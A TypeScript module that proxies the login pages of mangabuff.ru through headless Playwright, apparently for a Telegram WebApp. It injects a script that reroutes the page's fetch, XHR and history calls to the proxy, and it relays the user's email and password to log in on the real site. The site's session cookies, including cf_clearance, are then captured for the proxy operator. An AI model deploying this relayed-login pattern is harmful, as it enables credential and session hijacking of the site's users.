import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar, Cookie } from 'tough-cookie';
import { chromium, type Browser } from 'playwright';

wrapper(axios);

export const TARGET = 'https://mangabuff.ru';

let sharedBrowser: Browser | null = null;

async function getBrowser(): Promise<Browser> {
    if (!sharedBrowser || !sharedBrowser.isConnected()) {
        sharedBrowser = await chromium.launch({ headless: true });
    }
    return sharedBrowser;
}

function patchHtml(html: string, proxyBase: string): string {
    const interceptScript = `
    <script>
        const _originalFetch = window.fetch;
        window.fetch = async function(url, options) {
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            } else if (typeof url === 'string' && url.startsWith('${TARGET}')) {
                url = url.replace('${TARGET}', '${proxyBase}');
            }
            
            const response = await _originalFetch(url, options);
            const clone = response.clone();
            
            try {
                const data = await clone.json();
                if (data && data._proxy_success) {
                    // Блокируем навигацию
                    window.onbeforeunload = () => true;
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.sendData(JSON.stringify({ success: true }));
                        setTimeout(() => {
                            window.onbeforeunload = null;
                            window.Telegram.WebApp.close();
                        }, 300);
                    } else {
                        document.body.innerHTML = '<h2>✅ Авторизация успешна!</h2>';
                    }
                    // Возвращаем модифицированный ответ без _proxy_success
                    return new Response(JSON.stringify({ status: true }), {
                        status: response.status,
                        headers: response.headers
                    });
                }
            } catch(e) {}
            
            return response;
        };

        const _originalXHROpen = window.XMLHttpRequest.prototype.open;
        const _originalXHRSend = window.XMLHttpRequest.prototype.send;

        window.XMLHttpRequest.prototype.open = function(method, url, ...rest) {
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            } else if (typeof url === 'string' && url.startsWith('${TARGET}')) {
                url = url.replace('${TARGET}', '${proxyBase}');
            }
            return _originalXHROpen.call(this, method, url, ...rest);
        };

        window.XMLHttpRequest.prototype.send = function(...args) {
            this.addEventListener('load', function() {
                try {
                    const data = JSON.parse(this.responseText);
                    if (data && data._proxy_success) {
                        window.onbeforeunload = () => true;
                        if (window.Telegram && window.Telegram.WebApp) {
                            window.Telegram.WebApp.sendData(JSON.stringify({ success: true }));
                            setTimeout(() => {
                                window.onbeforeunload = null;
                                window.Telegram.WebApp.close();
                            }, 300);
                        } else {
                            document.body.innerHTML = '<h2>✅ Авторизация успешна!</h2>';
                        }
                    }
                } catch(e) {}
            });
            return _originalXHRSend.apply(this, args);
        };

        const _pushState = history.pushState.bind(history);
        history.pushState = function(state, title, url) {
            if (window.onbeforeunload) return;
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            }
            return _pushState(state, title, url);
        };

        const _replaceState = history.replaceState.bind(history);
        history.replaceState = function(state, title, url) {
            if (window.onbeforeunload) return;
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            }
            return _replaceState(state, title, url);
        };
    </script>
`;

    return html
        .replace('</head>', interceptScript + '</head>')
        .replace(/href="([^"]*?\.(css|woff2?|ttf)[^"]*)"/g, (_m, url) => {
            const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
            return `href="${absolute}"`;
        })
        .replace(/src="([^"]*?\.(js|png|jpg|jpeg|gif|svg|webp)[^"]*)"/g, (_m, url) => {
            const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
            return `src="${absolute}"`;
        })
        .replace(/action="([^"]*?)"/g, (match, url) => {
            if (url.startsWith('http') && !url.startsWith(TARGET)) return match;
            const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
            return `action="${absolute.replace(TARGET, proxyBase)}"`;
        })
        .replace(/href="(\/[^"]*?)"/g, (_m, url) => {
            return `href="${proxyBase}${url}"`;
        });
}

export async function proxyGet(
    path: string,
    proxyBase: string,
    jar: CookieJar,
): Promise<{ html: string; status: number }> {
    const browser = await getBrowser();
    const context = await browser.newContext();
    const page = await context.newPage();

    try {
        await page.goto(`${TARGET}${path}`, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const html = await page.content();

        // Перекладываем куки (включая cf_clearance) в jar для последующих axios-запросов
        const pwCookies = await context.cookies();
        for (const c of pwCookies) {
            try {
                await jar.setCookie(
                    `${c.name}=${c.value}; Domain=${c.domain}; Path=${c.path ?? '/'}${c.secure ? '; Secure' : ''}`,
                    TARGET,
                );
            } catch (_) {}
        }

        return { html: patchHtml(html, proxyBase), status: 200 };
    } finally {
        await context.close();
    }
}

export async function proxyPost(
    path: string,
    body: Record<string, string>,
    _jar: CookieJar,
): Promise<{ cookies: Cookie[]; redirectUrl: string; loginOk: boolean }> {
    const browser = await getBrowser();
    const context = await browser.newContext();
    const page = await context.newPage();

    try {
        await page.goto(`${TARGET}${path}`, { waitUntil: 'domcontentloaded', timeout: 30000 });

        const emailField = await page.$('input[name="email"], input[type="email"]');
        const passwordField = await page.$('input[name="password"], input[type="password"]');

        if (!emailField || !passwordField) {
            console.error('Login form fields not found');
            return { cookies: [], redirectUrl: '', loginOk: false };
        }

        await emailField.fill(body.email ?? '');
        await passwordField.fill(body.password ?? '');
        await page.waitForSelector('button.login-button:not([disabled])', { timeout: 10000 });
        await page.click('button.login-button');

        await page
            .waitForURL((url) => !url.pathname.includes('/login'), { timeout: 10000 })
            .catch(() => {});

        const finalUrl = page.url();
        const loginOk = !finalUrl.includes('/login');
        console.log('Login ok:', loginOk, '→', finalUrl);

        const pwCookies = await context.cookies();
        const cookies: Cookie[] = pwCookies.map(
            (c) =>
                new Cookie({
                    key: c.name,
                    value: c.value,
                    domain: c.domain.replace(/^\./, ''),
                    path: c.path ?? '/',
                    secure: c.secure,
                }),
        );

        console.log(
            'Cookies:',
            cookies.map((c) => c.key),
        );
        return { cookies, redirectUrl: finalUrl, loginOk };
    } finally {
        await context.close();
    }
}
